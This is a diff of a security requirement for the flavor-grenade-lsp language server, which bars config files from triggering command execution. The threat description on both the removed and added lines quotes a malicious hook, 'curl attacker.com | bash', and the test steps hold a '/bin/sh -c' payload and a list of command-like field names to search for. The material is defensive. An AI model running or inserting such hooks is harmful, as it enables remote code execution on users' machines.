@@ -61,19 +61,19 @@ aliases:
 ## Security.Config.NoCodeExecution
 
 **Tag:** Security.Config.NoCodeExecution
-**Gist:** The `.flavor-grenade.toml` configuration schema must never include fields that specify commands, executables, or scripts to be run by the server; vault-provided configuration must never cause process spawning.
-**Ambition:** The 2026 OpenCode vulnerability demonstrated that allowing a repository's configuration file to specify which LSP server binary to launch creates an arbitrary code execution vector. A malicious vault's `.flavor-grenade.toml` could specify a `[hooks] on_save = "curl attacker.com | bash"` field that executes arbitrary commands whenever the server processes a file save event. The fix is architectural: the server's configuration schema must simply not include any field type that represents a command, script path, or executable. This is enforced by schema validation — any TOML key in a command-execution position is rejected. If the server ever needs to run external tools, that capability must be introduced via a new ADR with explicit user-consent mechanisms (e.g., `window/showMessageRequest` prompting the user to allow execution of a specific binary).
-**Scale:** Boolean — the `.flavor-grenade.toml` schema contains no fields of type "command", "executable", "script", or "shell". Verified by schema inspection and by attempting to add a command field via a crafted TOML file.
+**Gist:** Project config schemas must never include fields that specify commands, executables, or scripts to be run by the server; vault-provided configuration must never cause process spawning.
+**Ambition:** The 2026 OpenCode vulnerability demonstrated that allowing a repository's configuration file to specify which LSP server binary to launch creates an arbitrary code execution vector. A malicious vault config could specify a `[hooks] on_save = "curl attacker.com | bash"` field that executes arbitrary commands whenever the server processes a file save event. The fix is architectural: the server's configuration schema must simply not include any field type that represents a command, script path, or executable. This is enforced by schema validation — any command-execution-position key is rejected. If the server ever needs to run external tools, that capability must be introduced via a new ADR with explicit user-consent mechanisms (e.g., `window/showMessageRequest` prompting the user to allow execution of a specific binary).
+**Scale:** Boolean — project config schemas contain no fields of type "command", "executable", "script", or "shell". Verified by schema inspection and by attempting to add command fields via crafted config files.
 **Meter:**
 
-1. Inspect the TOML schema definition for `.flavor-grenade.toml` in `src/`.
+1. Inspect the project config schema definitions in `src/`.
 2. Verify no field accepts a string value intended to be executed as a command (search for field names: `command`, `cmd`, `exec`, `script`, `hook`, `run`, `shell`, `binary`, `path` in executable context).
-3. Create a test `.flavor-grenade.toml` with a crafted `[hooks] on_index = "/bin/sh -c 'touch /tmp/pwned'"`.
+3. Create crafted TOML, JSONC, YAML, and `.editorconfig` configs with hook/command fields such as `[hooks] on_index = "/bin/sh -c 'touch /tmp/pwned'"`.
 4. Start the server against this config.
 5. Verify `/tmp/pwned` is not created.
 6. Verify the unknown `[hooks]` section is silently ignored (falls back to defaults).
-**Fail:** Any server behaviour that executes a command, script, or external process in response to content in `.flavor-grenade.toml`.
-**Goal:** 0 command-execution fields in the configuration schema; any command-like TOML content is silently ignored.
+**Fail:** Any server behaviour that executes a command, script, or external process in response to project config content.
+**Goal:** 0 command-execution fields in project config schemas; any command-like config content is silently ignored.
 **Stakeholders:** Vault authors, security auditors, users of shared or third-party vaults.
 **Owner:** flavor-grenade-lsp contributors.
 **Source:** [[docs/research/security-threat-model]], OpenCode LSP configuration vulnerability (2026), [[docs/adr/ADR002-ofm-only-scope]].
